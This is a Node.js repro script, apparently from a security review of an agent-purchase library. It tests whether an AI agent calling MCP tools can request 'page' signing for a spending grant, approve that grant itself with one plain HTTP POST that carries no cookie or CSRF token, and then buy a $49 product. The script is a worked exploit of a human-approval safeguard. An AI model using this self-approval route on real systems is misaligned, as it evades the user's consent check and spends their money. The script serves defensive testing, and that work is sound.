// Repro: can the MODEL (MCP tool caller) choose signing:"page" and then self-approve
// its own grant with one plain HTTP POST — no browser, no phone, no human?
//
// Store setup = the documented default wiring: createStorefront({ grants: ca.grants }) +
// ca.grants.serve(store.app). NOTHING store-side opts into page mode.
//
// Run from the repo root:  node docs/reviews/2026-10-agent-purchases/repros/model-chooses-page-signing.mjs
import { CredentAgent } from "@openmobilehub/credentagent-gate";
import { createStorefront } from "@openmobilehub/credentagent-storefront/server";
import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/client";

const PORT = 7000 + Math.floor(Math.random() * 2000);
const ORIGIN = `http://localhost:${PORT}`;

const ca = new CredentAgent({
  walletOrigin: ORIGIN,
  catalog: {
    "drift-mouse": { price: 49, category: "Electronics" },
    "oak-whiskey": { price: 124, minAge: 21, category: "Beverages" },
    "lumen-desk-lamp": { price: 59, category: "Home" },
  },
});
const store = createStorefront({ grants: ca.grants });
ca.grants.serve(store.app);
const { url } = await store.listen(PORT);

// ── the AI agent: a plain MCP client over HTTP ─────────────────────────────────
const client = new Client({ name: "agent", version: "1.0.0" });
await client.connect(new StreamableHTTPClientTransport(new URL(url)));

const tools = (await client.listTools()).tools;
const createTool = tools.find((t) => t.name === "create-spending-grant");
console.log("[1] create-spending-grant inputSchema.signing =", JSON.stringify(createTool.inputSchema.properties.signing));

const approveAction = (id) => `${ORIGIN}/credentagent/grants/${encodeURIComponent(id)}/approve`;

// Baseline: default (device) grant — the page-approve POST must NOT authorize it.
const dev = (await client.callTool({ name: "create-spending-grant", arguments: { budget: 200, perSpend: 60 } })).structuredContent;
const devPost = await fetch(approveAction(dev.id), { method: "POST", redirect: "manual" });
const devAfter = await ca.grants.retrieve(dev.id);
console.log(`[2] baseline default grant ${dev.id}: POST /approve -> HTTP ${devPost.status}; status now = ${devAfter.status} (signing=${devAfter.signing})`);

// Attack: the model asks for signing:"page" itself.
const g = (await client.callTool({
  name: "create-spending-grant",
  arguments: { budget: 200, perSpend: 60, signing: "page" },
})).structuredContent;
console.log(`[3] agent-created grant ${g.id}: status=${g.status} trustLevel=${g.trustLevel} approveUrl=${g.approveUrl}`);
console.log(`    store record signing = ${(await ca.grants.retrieve(g.id)).signing}`);

// One plain POST — no cookie, no CSRF token, no browser, no phone.
const r = await fetch(approveAction(g.id), { method: "POST", redirect: "manual" });
console.log(`[4] plain fetch POST ${approveAction(g.id)} -> HTTP ${r.status} Location=${r.headers.get("location")}`);

const status = (await client.callTool({ name: "get-grant-status", arguments: { grantId: g.id } })).structuredContent;
console.log(`[5] get-grant-status (via MCP): status=${status.status} trustLevel=${status.trustLevel}`);

const spend = (await client.callTool({
  name: "spend-from-grant",
  arguments: { grantId: g.id, productId: "drift-mouse" },
})).structuredContent;
console.log(`[6] spend-from-grant drift-mouse ($49):`, JSON.stringify(spend.spend));

const reproduced = devAfter.status === "pending" && status.status === "authorized" && spend.spend?.ok === true;
console.log(`\nRESULT: ${reproduced ? "REPRODUCED — agent self-approved a page grant and spent from it with no human/phone" : "NOT reproduced"}`);
await client.close();
process.exit(0);
